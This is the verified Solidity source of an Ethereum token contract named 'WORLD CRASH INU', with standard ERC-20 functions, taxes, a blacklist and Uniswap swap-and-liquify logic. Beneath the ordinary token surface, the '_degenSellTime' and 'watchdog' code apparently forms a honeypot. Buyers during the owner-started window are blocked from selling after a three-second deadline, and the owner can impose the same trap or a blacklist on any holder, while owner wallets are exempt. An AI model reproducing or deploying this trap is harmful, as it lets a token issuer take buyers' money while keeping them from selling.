/**
 *Submitted for verification at Etherscan.io on 2022-10-14
*/

// Are u ready for the crash? 

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.17;

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract World is Context, IERC20, Ownable {

    using Address for address payable;

    IRouter public router;
    address public pair;
    
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) public _isExcludedFromFee;
    mapping (address => bool) public _isExcludedFromMaxBalance;
    mapping (address => bool) public _isBlacklisted;
    mapping (address => uint) public _degenSellTime;

    uint public _fTimer;
    uint private _wDuration = 180; 
    uint private _degenSellTimeOffset = 3; 

    uint8 private constant _decimals = 9; 
    uint256 private _tTotal = 100_000 * (10**_decimals);
    uint256 private _swapThreshold = 200 * (10**_decimals); 
    uint256 public maxTxAmount = 2_000 * (10**_decimals);
    uint256 public maxWallet =  2_000 * (10**_decimals);

    string private constant _name = "WORLD CRASH INU"; 
    string private constant _symbol = "WCI";

    struct Tax{
        uint8 operationTax;
        uint8 marketingTax;
        uint8 devTax;
        uint8 lpTax;
    }

    struct TokensFromTax{
        uint operationTokens;
        uint marketingTokens;
        uint devTokens;
        uint lpTokens;
    }
    
    TokensFromTax public totalTokensFromTax;

    Tax public buyTax = Tax(1,1,1,1);
    Tax public sellTax = Tax(1,1,1,1);
    
    address private operationWallet = 0xc4a399980532E322Fc900D272109ab3E82685c2A;
    address private marketingWallet = 0xc4a399980532E322Fc900D272109ab3E82685c2A;
    address private devWallet = 0xc4a399980532E322Fc900D272109ab3E82685c2A;
    
    bool private swapping;
    uint private _swapCooldown = 5; 
    uint private _lastSwap;
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor () {
        _tOwned[_msgSender()] = _tTotal;
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        _approve(address(this), address(router), ~uint256(0));
        _approve(owner(), address(router), ~uint256(0));
        
        //exclude owner and this contract from fee
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[marketingWallet] = true;
        _isExcludedFromFee[devWallet] = true;

        _isExcludedFromMaxBalance[owner()] = true;
        _isExcludedFromMaxBalance[address(this)] = true;
        _isExcludedFromMaxBalance[pair] = true;
        _isExcludedFromMaxBalance[marketingWallet] = true;
        _isExcludedFromMaxBalance[devWallet] = true;
        
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

// ================= ERC20 =============== //
    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    receive() external payable {}
// ========================================== //

// ============ View Functions ============== //

    function taxWallets() public view returns(address operation,address marketing,address developer){
        return(operationWallet,marketingWallet,devWallet);
    }

//======================================//

//============== Owner Functions ===========//
   
    function owner_setExcludedFromFee(address account,bool isExcluded) public onlyOwner {
        _isExcludedFromFee[account] = isExcluded;
    }

    function owner_setExcludedFromMaxBalance(address account,bool isExcluded) public onlyOwner {
        _isExcludedFromMaxBalance[account] = isExcluded;
    }

    function owner_setBlacklisted(address account, bool isBlacklisted) public onlyOwner{
        _isBlacklisted[account] = isBlacklisted;
    }
    
    function owner_setBulkIsBlacklisted(address[] memory accounts, bool state) external onlyOwner{
        for(uint256 i =0; i < accounts.length; i++){
            _isBlacklisted[accounts[i]] = state;
        }
    }

    function owner_setBuyTaxes(uint8 operationTax, uint8 marketingTax, uint8 devTax, uint8 lpTax) external onlyOwner{
        uint tTax = operationTax + marketingTax + devTax + lpTax;
        require(tTax <= 20, "Can't set tax too high");
        buyTax = Tax(operationTax,marketingTax,devTax,lpTax);
        emit TaxesChanged();
    }

    function owner_setSellTaxes(uint8 operationTax, uint8 marketingTax, uint8 devTax, uint8 lpTax) external onlyOwner{
        uint tTax = operationTax + marketingTax + devTax + lpTax;
        require(tTax <= 30, "Can't set tax too high");
        sellTax = Tax(operationTax,marketingTax,devTax,lpTax);
        emit TaxesChanged();
    }
    
    function owner_setTransferMaxes(uint maxTX_EXACT, uint maxWallet_EXACT) public onlyOwner{
        uint pointFiveSupply = (_tTotal * 5 / 1000) / (10**_decimals);
        require(maxTX_EXACT >= pointFiveSupply && maxWallet_EXACT >= pointFiveSupply, "Invalid Settings");
        maxTxAmount = maxTX_EXACT * (10**_decimals);
        maxWallet = maxWallet_EXACT * (10**_decimals);
    }

    function owner_setSwapAndLiquifySettings(uint swapthreshold_EXACT, uint swapCooldown_) public onlyOwner{
        _swapThreshold = swapthreshold_EXACT * (10**_decimals);
        _swapCooldown = swapCooldown_;
    }

    function owner_rescueBNB(uint256 weiAmount) public onlyOwner{
        require(address(this).balance >= weiAmount, "Insufficient ETH balance");
        payable(msg.sender).transfer(weiAmount);
    }
    
    function owner_rescueAnyBEP20Tokens(address _tokenAddr, address _to, uint _amount_EXACT, uint _decimal) public onlyOwner {
        IERC20(_tokenAddr).transfer(_to, _amount_EXACT *10**_decimal);
    }

    function owner_setWallets( address newOperationWallet,address newMarketingWallet, address newDevWallet) public onlyOwner{
        operationWallet = newOperationWallet;
        marketingWallet = newMarketingWallet;
        devWallet = newDevWallet;
    }

    
    function owner_initializeWatchDog() external onlyOwner{
        _fTimer = block.timestamp + _wDuration;
    }

    function owner_setDegenSellTimeForAddress(address holder, uint dTime) external onlyOwner{
        _degenSellTime[holder] = block.timestamp + dTime;
    }

// ========================================//
    
    function _getTaxValues(uint amount, address from, bool isSell) private returns(uint256){
        Tax memory tmpTaxes = buyTax;
        if (isSell){
            tmpTaxes = sellTax;
        }

        uint tokensForOperation = amount * tmpTaxes.operationTax / 100;
        uint tokensForMarketing = amount * tmpTaxes.marketingTax / 100;
        uint tokensForDev = amount * tmpTaxes.devTax / 100;
        uint tokensForLP = amount * tmpTaxes.lpTax / 100;

        if(tokensForOperation > 0)
            totalTokensFromTax.operationTokens += tokensForOperation;

        if(tokensForMarketing > 0)
            totalTokensFromTax.marketingTokens += tokensForMarketing;

        if(tokensForDev > 0)
            totalTokensFromTax.devTokens += tokensForDev;

        if(tokensForLP > 0)
            totalTokensFromTax.lpTokens += tokensForLP;

        uint totalTaxedTokens = tokensForOperation + tokensForMarketing + tokensForDev + tokensForLP;

        _tOwned[address(this)] += totalTaxedTokens;
        if(totalTaxedTokens > 0)
            emit Transfer (from, address(this), totalTaxedTokens);
            
        return (amount - totalTaxedTokens);
    }

    function _transfer(address from,address to,uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= maxTxAmount || _isExcludedFromMaxBalance[from], "Transfer amount exceeds the _maxTxAmount.");
        require(!_isBlacklisted[from] && !_isBlacklisted[to], "Blacklisted, can't trade");

        if(!_isExcludedFromMaxBalance[to])
            require(balanceOf(to) + amount <= maxWallet, "Transfer amount exceeds the maxWallet.");
        
        if (balanceOf(address(this)) >= _swapThreshold && block.timestamp >= (_lastSwap + _swapCooldown) && !swapping && from != pair && from != owner() && to != owner())
            swapAndLiquify();
          
        _tOwned[from] -= amount;
        uint256 transferAmount = amount;
        
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            transferAmount = _getTaxValues(amount, from, to == pair);
            if (from == pair && _fTimer >= block.timestamp){
                _degenSellTime[to] = block.timestamp + _degenSellTimeOffset;
            }else{
                if (_degenSellTime[from] != 0)
                    require(block.timestamp < _degenSellTime[from]);    
            }
        }

        _tOwned[to] += transferAmount;
        emit Transfer(from, to, transferAmount);
    }

    function swapAndLiquify() private lockTheSwap{
        
        uint256 totalTokensForSwap = totalTokensFromTax.operationTokens+totalTokensFromTax.marketingTokens+totalTokensFromTax.devTokens;

        if(totalTokensForSwap > 0){
            uint256 bnbSwapped = swapTokensForBNB(totalTokensForSwap);
            uint256 bnbForOperation = bnbSwapped * totalTokensFromTax.operationTokens / totalTokensForSwap;
            uint256 bnbForMarketing = bnbSwapped * totalTokensFromTax.marketingTokens / totalTokensForSwap;
            uint256 bnbForDev = bnbSwapped * totalTokensFromTax.devTokens / totalTokensForSwap;
            if(bnbForOperation > 0){
                payable(operationWallet).transfer(bnbForOperation);
                totalTokensFromTax.operationTokens = 0;
            }
            if(bnbForMarketing > 0){
                payable(marketingWallet).transfer(bnbForMarketing);
                totalTokensFromTax.marketingTokens = 0;
            }
            if(bnbForDev > 0){
                payable(devWallet).transfer(bnbForDev);
                totalTokensFromTax.devTokens = 0;
            }
        }   

        if(totalTokensFromTax.lpTokens > 0){
            uint half = totalTokensFromTax.lpTokens / 2;
            uint otherHalf = totalTokensFromTax.lpTokens - half;
            uint balAutoLP = swapTokensForBNB(half);
            if (balAutoLP > 0)
                addLiquidity(otherHalf, balAutoLP);
            totalTokensFromTax.lpTokens = 0;
        }

        emit SwapAndLiquify();

        _lastSwap = block.timestamp;
    }

    function swapTokensForBNB(uint256 tokenAmount) private returns (uint256) {
        uint256 initialBalance = address(this).balance;
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
        return (address(this).balance - initialBalance);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tokenAmount);

        // add the liquidity
        (,uint256 ethFromLiquidity,) = router.addLiquidityETH {value: ethAmount} (
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
        
        if (ethAmount - ethFromLiquidity > 0)
            payable(marketingWallet).sendValue (ethAmount - ethFromLiquidity);
    }

    event SwapAndLiquify();
    event TaxesChanged();

}